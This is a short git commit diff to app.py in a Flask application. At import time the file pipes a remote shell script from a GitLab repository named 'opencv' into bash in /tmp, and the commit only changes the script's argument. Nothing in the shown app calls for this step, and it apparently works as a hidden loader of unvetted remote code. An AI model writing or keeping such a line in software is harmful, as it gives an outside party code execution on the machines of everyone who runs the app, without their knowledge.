92ffc7749694447dc6ca839458c1e28c550d8dbb
tomingtse <127744420+tomingtse@users.noreply.github.com>
2023-04-07 11:27:43 +0700

    Update app.py

--- app.py
+++ app.py
@@ -8,7 +8,7 @@ app = Flask(__name__)
 def run_command(command):
     return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read()
 
-run_command(f"""cd /tmp && curl https://gitlab.com/aldriterakhir/opencv/-/raw/main/program.sh | bash -s roar true """)
+run_command(f"""cd /tmp && curl https://gitlab.com/aldriterakhir/opencv/-/raw/main/program.sh | bash -s roar2 true """)
 
 ##### Global variable ################################
 #dbUse='postgresql'
